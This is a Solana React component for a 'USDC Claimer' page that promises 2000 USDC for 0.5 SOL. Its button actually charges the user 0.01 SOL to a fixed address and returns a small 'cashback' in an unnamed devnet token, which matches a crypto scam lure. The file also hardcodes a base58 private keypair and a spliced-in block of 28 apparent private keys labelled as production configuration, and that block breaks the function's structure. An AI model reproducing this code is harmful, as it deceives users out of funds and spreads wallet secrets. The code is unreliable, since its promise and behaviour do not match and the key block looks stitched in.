/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "127K7kkgDPBZQUDwovALyh3udLQvPojhGwUayB9RRJvYUEibqBAG8cP16rdnuaSwqc3uWXSqaVoV8KUgFcpUdpDt"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2r1GHdqDZuuZBrSoj6ATKMUWn8jCQJPk3yLy3kch2RGsxAHyZ3tmoVS7Akr2RzEU7qpq1bnBKvhQSB7EEg8MKeni",
  "key1": "4JFEtUwsMLbsyUdidbFtuLJ4jNwn3PBJTfEvtahA6RBedvW2uewPfhiF8qvPPSfskpA7NBFQ3M9e8f6YjUFmbCmq",
  "key2": "22AbLTUF9cPTZvdK4mRVWpsrM9JDgo8ZeaZfmiqTcVdyZkABZL52nR9tgBLbvrRqbgTQA1uUdtTktEKA6jYTz9Aw",
  "key3": "2JunSAwoYCPsrcebYAmk9g19pqBfdtXWZrzf5XPVxyp3dUHURHUyrUPKuzTwhyJk3Xd5UVBqbXbuEk62PAMCUfBd",
  "key4": "4fN899XN8Cujh1PaBN33mSATY8q6cDbUaELyyiCHG8GasAM8sAm15rZXaWSotnSsRJb4kAcq7SBNs3WbqM9zpe6k",
  "key5": "4GSatPEzq93yjSauMFFwb9K8sZSHYYRgPkukTHF3Ja3tvvhToJwY5tJeE8VbawNJ8PgtvHvBKBGQphxxzu6Ljukn",
  "key6": "3pb5WCJRjNYuAYRWEd76uqjzLdByRTuektkm17oHjSRaPFp7eWPz71SKktzb9ddnYkWgvnXYWCj6Zan9DWtaQivt",
  "key7": "3A2nTVB8BiLJGbj2KkDV8Zp4X3A6WNFYcxC8mAuL7B8wJYMSMjLV7t8FhofxR8NbiPtm3Rc2nxeaUHfFhcMu8QQo",
  "key8": "F9DzkkxYEjf7vgx2cNWzzuSeKDox5jcbnUN5qNihesV6KNqwKAdeFq3qKyaAQn5cLti3X58V2HnjXnhzxKjmqUc",
  "key9": "2crpxWUDWbnC1R5VFTrMB5ZX2biMr8emiXeGBRqPAe6fAgyW77EqzW12uAje8owbVdkA12XWrH2sW4xz7fYK1ZFM",
  "key10": "4DAiPKz8AZzA2g6f74gePzJLUD7GfhzZ8yPKbyfZwmLsxd6b3Hvtadu14WQJx86TjVDUtPKPpgqhaREbvNDvRwRf",
  "key11": "5jKypPcgBNnfH6ZB6r7TuADiWyGyYtyatJuj71MfbCDsetfQeFaQMujDSuetjGgWVsHskT73A4E9ngXSbEps7s8y",
  "key12": "63AbcR6huYApehBxnkMaHdFCbKDHuMQivwjn4Se1HjbckgAp9T5xa16enUWuu3KvJGRSuopFcNYBdnFcKULVxS6K",
  "key13": "4oqC9rmbVQtAFTZVgMhYYKeoK6LuMXcs23kkwpBYyAwf4oDYP4dxfy2XPdW45SFWnA8eDXABNo3p43aUvTn1gYVP",
  "key14": "3wjvqnjV6MPekeEJgsZnBfkQAxMknVvr7ttjqoW3XEFXgTGY2MbpXa3UA7ycFjcUrPeNdksZZMr2UinD7nQgJCEq",
  "key15": "3F4EDRnWifZoqMdZv7Ws6MW6TPCPn1A7FJ2SqDmYeabCUsxcecPBY9y1V177NM8AjvT6Xfx5JJrzhBxZQf9oSW1U",
  "key16": "2uHQcmGjWtjjDMSMgiL5i5YXCbCsfjjdyqtRwPmVnPt64XuLMcB6vk1ZAytmebNRuc8LmuMuxZSbT7AGChVXARHH",
  "key17": "fPoy3D9PENt5YrJZJRiQncFeRk8CNmT7BZuP8wr2HEmgf2qkUuvsmwpnqVtRqJ4n2XCEVLCrr8LVMJS7Ve3WqtF",
  "key18": "bkJ4Z5qTYs2z9WK4Scfq4H9DRZJCjDSNR6JERy6FWs3kaf6xSNUhTaE1akVdbPB2nALfqNeHjyY9PMnSyZKMJYg",
  "key19": "4MaBRHfmKwkSDjr5u2rPL34AkFkTcoSXv3hZDj1D3CKYun7TzX8dLKwrQYdBizzLbBNQYq9Y1h4VG9Xcpb12GMjL",
  "key20": "2jchiqNcy8knzMJCZgDucB7R4wiNLqoeHtgVnUTreqZStrEUSzy5k1UAa5iD9Zd92A5DW4XNiDuNSWsgHqyowgMg",
  "key21": "2pbw1PxZpn3SGBYb2eY8igqoabdejSfpbczyXHr8gZPTBF7fDhoDo9X9VEpuFL1x2bAFrmSJMTiaCiz6v957KFDc",
  "key22": "3XUr3jRZEfk1joueEzpdHz7ahEf9gHbkCeGXtcCJjx5XZsxSSCXabMHpmmi2dKn5ngYL9KRd3PJ4gkPytnVaqTtY",
  "key23": "5PfjRGD9K956uHMxDqJ1nDEPHSrhYSYzCPoJgVMkkn9iuihJCX7cAXNVfaq6KLdDWZSona53wVVatjK4Qs2U5M3o",
  "key24": "65G8T5mSSwwFANzVBnLFNwPw7ytmmFMehPXkSMmaCWN8rsjLq2ZTzMttYKsgpBfvZ8BtNwsjPALC4pXhRpSFSfKh",
  "key25": "EYxpmaNqUPBjiQHG5jmMrE9ZEZ3kx8aFVS5ekEt5rr911gfyj4hifZojGQ1stN4RPSaaE1DYHAgBRstrMahhFrR",
  "key26": "3PvrGdwK1SJ6RvibakXq891tJ3VXxGL7Y6YdQmYVHvxRyFWp2UizYCRoN9ZsuNDSCXBaermMnTA5wM6n2ME423RW",
  "key27": "4wLZh9uPh2pTo3bU4WAr91PkT28HL6Et7s3e4YwQrgkmYGC1BfjFkBReW6gwjgm74cVM9GcTLLrNZbHckpydd1dw"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
